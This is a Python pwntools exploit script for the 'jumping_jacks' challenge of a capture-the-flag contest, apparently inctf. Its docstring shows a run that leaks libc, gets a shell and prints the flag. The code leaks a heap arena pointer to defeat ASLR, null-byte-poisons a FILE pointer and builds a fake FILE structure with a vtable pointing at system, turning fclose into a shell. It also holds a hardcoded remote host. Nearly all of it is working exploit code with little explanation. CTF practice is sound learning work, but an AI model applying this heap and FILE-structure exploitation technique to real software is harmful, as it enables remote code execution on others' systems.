"""
[+] Libc:   0xf75ff000
[+] system: 0xf7639da0
[*] Switching to interactive mode
$ whoami
jumpingjacks
$ ls
flag
jumping_jacks
libc.so.6
start_chall.sh
$ cat flag
inctf{fil3_p0in7er_m4g1c_1s_fun}
"""

from pwn import *

sys_off = 0x0003ada0
sh_off  = 0x15b9ab
array   = 0x804a080
bss     = 0x804a0c0
vtable  = bss - 17*4

def alloc(size, idx, data):
	r.sendlineafter('>> ', '1')
	r.sendlineafter('input\n', str(size))
	r.sendlineafter('index\n', str(idx))
	r.sendlineafter('Content\n', data)
	return

def free(idx):
	r.sendlineafter('>> ', '2')
	r.sendlineafter('index\n', str(idx))
	return

def leak(idx):
	r.sendlineafter('>> ', '3')
	r.sendlineafter('index\n', str(idx))
	r.recvline()
	return u32(r.recv(4))

def craft(size, idx, data):
	r.sendlineafter('>> ', '1')
	r.sendlineafter('input\n', str(size))
	r.sendlineafter('index\n', str(idx))
	r.sendafter('Content\n', data)
	return

def Open():
	r.sendlineafter('>> ', '4')
	return

def Close():
	r.sendlineafter('>> ', '5')
	return

def edit(data):
	r.sendlineafter('>> ', '6')

	if len(data) < 64:
		data += '\n'
	r.send(data)
	return

def pwn():
	# 0
	alloc(0x108, 0,  'A'*8) 
	# 1
	alloc(0x158,  1, 'B'*8)
	# 2
	alloc(0x80,  2, 'C'*8)	
	# 3
	alloc(0xa8,  3, 'D'*8)
	# Trigger malloc
	Open()
	# Free it so that its FD/BK contain main arena's pointers
	free(1)
	# Enter just enough to leak the main arena pointer
	alloc(0x158,  1, 'E'*3)

	libc   = leak(1) - 0x1b27b0
	system = libc + sys_off
	binsh  = libc + sh_off
	log.success("Libc:   0x{:x}".format(libc))
	log.success("system: 0x{:x}".format(system))
	# Null byte poison the FILE pointer so that it points 
	# to an area we control & set up the fake FILE vtable
	edit(p32(system) + p32(0)*3)

	# Free chunk and re-allocate it again to craft the fake FILE structure
	free(3)

	stream  = 'sh\x00\x00'
	stream += p32(0)*12
	# Needs to point ot null
	stream += p32(0x804a0f0)
	stream += p32(3)
	stream += p32(0)*3
	# Needs to point to null
	stream += p32(0x804a0f0)
	stream += p32(0xffffffff)*2
	stream += p32(0)
	# Needs to point to null
	stream += p32(0x804a0f0)
	stream += p32(0)*14
	stream += p32(vtable)

	craft(0xa8, 3, stream)
	# fclose(fp) => system(fp) => system("sh")
	Close()

	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if sys.argv[1] == "r":
        r = remote('35.196.182.186', 8181)
        pwn()
    else:
        r = process('./jumping_jacks')
        pause()
        pwn()
